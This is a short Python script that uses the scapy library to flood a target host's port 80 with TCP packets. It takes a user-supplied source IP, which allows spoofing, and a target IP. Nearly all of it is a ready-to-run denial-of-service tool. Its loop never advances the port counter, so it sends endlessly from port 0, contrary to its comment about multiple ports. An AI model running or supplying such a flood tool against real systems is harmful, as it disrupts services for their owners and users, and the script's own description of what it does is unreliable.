#!/usr/bin/python3

# Below code is used to perform TCP flood attack 
# using Single IP and Multiple Ports

# from is used to import python libraries 

from scapy.all import *

# declaration of variables 

inital_port_number = 0
source_ipaddress_var = 0
target_ipaddress_var = 0
counter_var = 1
prepared_packet_var = 0
preparing_source_and_target_ip = 0
preparing_initial_and_destination_port_for_tcp = 0

# Taking inputs from user
 
source_ipaddress_var = input("Enter source machine IP address: ")
target_ipaddress_var = input("Enter target machine IP address: ")



while (inital_port_number <= 65535 ):

	preparing_source_and_target_ip = IP(src=source_ipaddress_var, dst = target_ipaddress_var)
	preparing_initial_and_destination_port_for_tcp = TCP(sport=inital_port_number, dport = 80)
	IP_1 = preparing_source_and_target_ip
	TCP_1 = preparing_initial_and_destination_port_for_tcp
	
	# prepared packet 
	prepared_packet_var = IP_1 / TCP_1
	
	# sending packet using send funtion
	send(prepared_packet_var)
	print("packet has been sent",counter_var)
	counter_var = counter_var + 1
	



